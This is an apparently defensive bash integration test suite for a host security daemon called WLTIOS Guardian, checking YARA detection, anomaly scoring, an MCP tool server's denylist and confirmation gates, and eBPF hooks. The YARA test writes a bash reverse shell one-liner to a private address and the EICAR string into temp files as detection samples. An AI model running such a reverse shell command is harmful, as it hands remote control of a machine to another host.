
#!/usr/bin/env bash
# WLTIOS Guardian — integration tests.
#
# These tests verify the Guardian engine works end-to-end in the dev sandbox.
# Tests that need CAP_BPF/root are skipped with a clear message.
#
# Run:  bash tests/run_all.sh

set -u
PASS=0
FAIL=0
SKIP=0
GUARDIAN_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$GUARDIAN_ROOT"

# Fallback to local yara installation if not in PATH
export PATH="$GUARDIAN_ROOT/local-yara/usr/bin:$PATH"
export LD_LIBRARY_PATH="$GUARDIAN_ROOT/local-yara/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"

source activate.sh >/dev/null 2>&1

# Resolve readelf binary
READELF="readelf"
if command -v eu-readelf >/dev/null 2>&1; then
    READELF="eu-readelf"
elif [ -n "${GUARDIAN_PREFIX:-}" ] && [ -x "${GUARDIAN_PREFIX}/bin/eu-readelf" ]; then
    READELF="${GUARDIAN_PREFIX}/bin/eu-readelf"
fi

ok()   { echo "  PASS: $1"; PASS=$((PASS+1)); }
bad()  { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }
skip() { echo "  SKIP: $1 ($2)"; SKIP=$((SKIP+1)); }

echo "========================================"
echo " WLTIOS Guardian — Integration Tests"
echo "========================================"

# ---- test 1: daemon self-test ----
echo ""
echo "[1] Daemon self-test"
if ./build/guardian --self-test 2>&1 | grep -q "self-test OK"; then
    ok "guardian --self-test passes"
else
    bad "guardian --self-test failed"
fi

# ---- test 2: SHA-256 correctness ----
echo ""
echo "[2] SHA-256 implementation"
HASH=$(./build/guardian --self-test 2>&1 | grep "sha256('abc')" | grep -oE '[a-f0-9]{64}')
if [ "$HASH" = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" ]; then
    ok "SHA-256('abc') matches known value"
else
    bad "SHA-256 mismatch: got $HASH"
fi

# ---- test 3: policy engine routing ----
echo ""
echo "[3] Policy engine threat→action routing"
./build/guardian --self-test 2>&1 | grep -q "policy(yara critical) -> QUARANTINE_FILE" && ok "yara critical → QUARANTINE_FILE"
./build/guardian --self-test 2>&1 | grep -q "AUTO QUARANTINE_FILE" && ok "autonomous quarantine executes"

# ---- test 4: YARA signature detection ----
echo ""
echo "[4] YARA signature detection"
# write EICAR test file
cat > /tmp/eicar_test.txt <<'EICAR'
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
EICAR
if yara rules/guardian.yar /tmp/eicar_test.txt 2>&1 | grep -q "EICAR_Test_File"; then
    ok "YARA detects EICAR test file"
else
    bad "YARA failed to detect EICAR"
fi
# reverse shell pattern
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1;0>&1' > /tmp/revshell_test.sh
if yara rules/guardian.yar /tmp/revshell_test.sh 2>&1 | grep -q "Reverse_Shell"; then
    ok "YARA detects reverse shell pattern"
else
    bad "YARA failed to detect reverse shell"
fi
# clean file should not match
echo "this is a clean file" > /tmp/clean_test.txt
if [ -z "$(yara rules/guardian.yar /tmp/clean_test.txt 2>&1)" ]; then
    ok "YARA clean file correctly produces no match"
else
    bad "YARA false-positive on clean file"
fi

# ---- test 5: anomaly ML model ----
echo ""
echo "[5] Anomaly ML (isolation forest)"
ANOM=$(python3 ml/anomaly.py --check '{"cpu_pct":85,"mem_mb":50,"net_conns":40,"file_writes_min":100,"fork_rate_min":15,"entropy_file_io":0.9,"distinct_ips_5min":30,"syscall_rate":2000}' 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['verdict'])")
if [ "$ANOM" = "anomaly" ]; then
    ok "anomaly ML flags anomalous process"
else
    bad "anomaly ML failed to flag anomaly (got: $ANOM)"
fi
CLEAN=$(python3 ml/anomaly.py --check '{"cpu_pct":3,"mem_mb":80,"net_conns":4,"file_writes_min":2,"fork_rate_min":0,"entropy_file_io":0.4,"distinct_ips_5min":2,"syscall_rate":500}' 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['verdict'])")
if [ "$CLEAN" = "clean" ]; then
    ok "anomaly ML clears normal process"
else
    bad "anomaly ML false-positive on normal process (got: $CLEAN)"
fi

# ---- test 6: MCP server tools (Python prototype + C production) ----
echo ""
echo "[6] MCP server tool registry"
# Python prototype
NTOOLS=$(python3 mcp/mcp_server.py --list-tools 2>/dev/null | grep "tools registered" | grep -oE '[0-9]+')
if [ "$NTOOLS" -ge 11 ] 2>/dev/null; then
    ok "MCP Python prototype has $NTOOLS tools"
else
    bad "MCP Python tool count wrong: $NTOOLS"
fi
# C production server (the real one)
if [ -x build/mcp_server ]; then
    NTOOLS_C=$(build/mcp_server --list-tools 2>/dev/null | grep "tools registered" | grep -oE '[0-9]+')
    # v1.4: 30 tools (shell_exec + install_package removed for C1 security fix)
    if [ "$NTOOLS_C" -ge 28 ] 2>/dev/null; then
        ok "MCP C server has $NTOOLS_C tools (production)"
    else
        bad "MCP C tool count wrong: $NTOOLS_C"
    fi
    # live C MCP JSON-RPC: process_list via stdio
    RESULT=$(echo '{"jsonrpc":"2.0","id":1,"method":"tools.list","params":{}}' | build/mcp_server --stdio 2>/dev/null)
    if echo "$RESULT" | grep -q "process_inspect"; then
        ok "MCP C server JSON-RPC responds to tools.list"
    else
        bad "MCP C server tools.list failed"
    fi
fi
# live JSON-RPC: process_list (Python)
RESULT=$(echo '{"jsonrpc":"2.0","id":1,"method":"tools.call","params":{"name":"process_list","args":{}}}' | python3 mcp/mcp_server.py 2>/dev/null)
if echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); assert 'result' in d and 'count' in d['result']" 2>/dev/null; then
    ok "MCP process_list returns live data"
else
    bad "MCP process_list failed"
fi
# live JSON-RPC: file_forensics
RESULT=$(echo '{"jsonrpc":"2.0","id":2,"method":"tools.call","params":{"name":"file_forensics","args":{"path":"build/guardian"}}}' | python3 mcp/mcp_server.py 2>/dev/null)
if echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); assert 'sha256' in d['result']" 2>/dev/null; then
    ok "MCP file_forensics returns sha256"
else
    bad "MCP file_forensics failed"
fi
# denylist: /proc/kcore should be blocked
RESULT=$(echo '{"jsonrpc":"2.0","id":3,"method":"tools.call","params":{"name":"file_forensics","args":{"path":"/proc/kcore"}}}' | python3 mcp/mcp_server.py 2>/dev/null)
if echo "$RESULT" | grep -q "denylist"; then
    ok "MCP denylist blocks /proc/kcore"
else
    bad "MCP denylist failed to block /proc/kcore"
fi
# irreversible: kill_switch should require confirm
RESULT=$(echo '{"jsonrpc":"2.0","id":4,"method":"tools.call","params":{"name":"kill_switch","args":{}}}' | python3 mcp/mcp_server.py 2>/dev/null)
if echo "$RESULT" | grep -q "irreversible"; then
    ok "MCP kill_switch requires MCP_AUTOCONFIRM"
else
    bad "MCP kill_switch did not gate on confirmation"
fi

# ---- test 7: eBPF program compiles ----
echo ""
echo "[7] eBPF program compilation"
if file build/bpf/guardian.bpf.o 2>/dev/null | grep -q "eBPF"; then
    ok "eBPF object is valid eBPF ELF"
    # count tracepoint hooks (should be 14: execve, execveat, openat, openat2,
    # connect, ptrace, clone, clone3, unshare, setns, bind, socket, setuid, capset)
    # count tracepoint hooks (should be 15 sections now with sched_process_exit)
    NHOOKS=$($READELF -W -S build/bpf/guardian.bpf.o 2>/dev/null | grep -c "tracepoint/syscalls/sys_enter_")
    if [ "$NHOOKS" -ge 14 ] 2>/dev/null; then
        ok "BPF program has $NHOOKS syscall hooks (full coverage)"
    else
        bad "BPF program has only $NHOOKS hooks (expected >= 14)"
    fi
    # Bug 18 fix: check for sched_process_exit hook (fork_last cleanup)
    if $READELF -W -S build/bpf/guardian.bpf.o 2>/dev/null | grep -q "sched_process_exit"; then
        ok "BPF has sched_process_exit hook (Bug 18 fix: fork_last cleanup)"
    else
        bad "BPF missing sched_process_exit hook (Bug 18 not fixed)"
    fi
    # Phase 2 verification: check for ioctl and rtnl_newroute hooks
    if $READELF -W -S build/bpf/guardian.bpf.o 2>/dev/null | grep -q "sys_enter_ioctl"; then
        ok "BPF has sys_enter_ioctl hook (Phase 2 ioctl route addition blocker)"
    else
        bad "BPF missing sys_enter_ioctl hook (Phase 2: ioctl blocker absent)"
    fi
    if $READELF -W -S build/bpf/guardian.bpf.o 2>/dev/null | grep -q "rtnl_newroute"; then
        ok "BPF has rtnl_newroute kprobe hook (Phase 2 netlink route addition blocker)"
    else
        bad "BPF missing rtnl_newroute kprobe hook (Phase 2: netlink blocker absent)"
    fi
else
    bad "eBPF object invalid"
fi

# ---- test 8: forensic log tamper-evidence ----
echo ""
echo "[8] Forensic log (SHA-256 chain + AES-GCM)"
timeout 1 ./build/guardian 2>&1 | grep -q "all engines online" && ok "daemon starts all engines" || bad "daemon failed to start engines"
if [ -f guardian.log ]; then
    SIZE=$(stat -c%s guardian.log 2>/dev/null || echo 0)
    if [ "$SIZE" -gt 0 ]; then
        ok "forensic log written ($SIZE bytes)"
    else
        bad "forensic log empty"
    fi
    # Bug 1 verification: if policy engine is wired, the log should contain
    # real enforcement actions (not just G_ACT_LOG). Check for "AUTO" or
    # "HUMAN-CONFIRM" in the daemon output.
    if timeout 1 ./build/guardian 2>&1 | grep -q "AUTO\|HUMAN-CONFIRM\|policy"; then
        ok "Bug 1 fix verified: policy engine fires in live operation"
    else
        skip "Bug 1 verification" "daemon may not have triggered policy in 1s"
    fi
else
    skip "forensic log file check" "log path varies in sandbox"
fi

# ---- test 9: Kairos instruction.md exists ----
echo ""
echo "[9] Kairos consultant layer"
if [ -f kairos/instruction.md ]; then
    if grep -q "Anti-Hallucination Rules" kairos/instruction.md && \
       grep -q "confidence" kairos/instruction.md && \
       grep -q "reversible" kairos/instruction.md; then
        ok "instruction.md has anti-hallucination + tier + confidence rules"
    else
        bad "instruction.md missing required sections"
    fi
else
    bad "kairos/instruction.md not found"
fi

# ---- test 10: ADR-09 exists ----
echo ""
echo "[10] ADR-09 documentation"
if [ -f docs/adr/09-guardian.md ] && grep -q "Defender-Style" docs/adr/09-guardian.md; then
    ok "ADR-09 documents the Defender-style decision"
else
    bad "ADR-09 missing or incomplete"
fi

# ---- Phase 3: WLTIOS integration tests (only when WLTIOS_MODE=1) ----
if [ "${WLTIOS_MODE:-0}" = "1" ]; then
    echo ""
    echo "[W1] Guardian is PID 3 (after watchdog at PID 2)"
    GPID=$(pgrep -x wlt-guardian || echo 0)
    WPID=$(pgrep -x wlt-guardian-watchdog || echo 0)
    if [ "$GPID" -gt 0 ] && [ "$WPID" -gt 0 ] && [ "$GPID" -gt "$WPID" ]; then
        ok "guardian PID $GPID > watchdog PID $WPID"
    else
        bad "guardian/watchdog PIDs wrong (g=$GPID w=$WPID)"
    fi

    echo ""
    echo "[W2] Tor UID detected at guardian init"
    if grep -q "tor detected" /var/log/guardian.log 2>/dev/null; then
        ok "guardian detected tor UID at init"
    else
        bad "guardian did not detect tor UID"
    fi

    echo ""
    echo "[W3] eBPF programs attached"
    if bpftool prog show 2>/dev/null | grep -q "guardian"; then
        ok "guardian BPF programs attached"
    else
        bad "no guardian BPF programs in bpftool prog show"
    fi

    echo ""
    echo "[W4] Canary files exist"
    NCAN=$(ls /tmp/!GUARDIAN_CANARY_* /var/tmp/!GUARDIAN_CANARY_* 2>/dev/null | wc -l)
    if [ "$NCAN" -ge 2 ]; then
        ok "$NCAN canary files deployed"
    else
        bad "only $NCAN canary files (expected >=2)"
    fi

    echo ""
    echo "[W5] FIM baseline has critical paths"
    if sqlite3 /etc/wlt/guardian/fim.db "SELECT count(*) FROM baseline WHERE path IN ('/etc/passwd','/etc/shadow','/etc/tor/torrc');" 2>/dev/null | grep -q "[3-9]"; then
        ok "FIM baseline covers passwd+shadow+torrc"
    else
        bad "FIM baseline missing critical paths"
    fi

    echo ""
    echo "[W6] Kill switch via wlt-shell -> guardian socket"
    if wlt-shell killswitch on 2>&1 | grep -q "activated"; then
        if bpftool map lookup name kill_switch_active 2>/dev/null | grep -q "0x01"; then
            ok "kill switch unified: shell -> socket -> BPF map = 1"
        else
            bad "kill switch BPF map not set"
        fi
    else
        bad "wlt-shell killswitch did not reach guardian"
    fi
fi

# ---- summary ----
echo ""
echo "========================================"
echo " Results: $PASS passed, $FAIL failed, $SKIP skipped"
echo "========================================"
[ $FAIL -eq 0 ]
